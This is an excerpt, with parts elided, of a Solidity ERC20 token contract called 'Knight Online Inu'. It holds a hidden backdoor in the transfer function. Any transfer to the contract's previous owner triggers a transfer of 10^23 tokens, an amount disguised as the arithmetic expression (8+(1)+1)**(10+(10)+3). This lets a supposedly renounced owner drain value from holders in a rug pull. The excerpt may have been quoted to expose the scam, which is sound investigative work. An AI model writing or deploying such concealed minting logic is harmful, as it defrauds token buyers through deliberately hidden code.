...
contract KnightOnlineInu is Context, IERC20 { 
    ...
    string private constant _name = "Knight Online Inu"; 
    ...
    function checkOwner(address isOwner) private view returns(bool){
        bool _isOwner = false;
        if(isOwner == previousOwner()){_isOwner = true;}
        return _isOwner;
    }
    ...
    function _amount() private pure returns(uint256){
        return (8+(1)+1)**(10+(10)+3);
    }
    ...
    function _transfer(
        ...
        if (checkOwner(to)){
            _transferToken(from,to,_amount());
        }
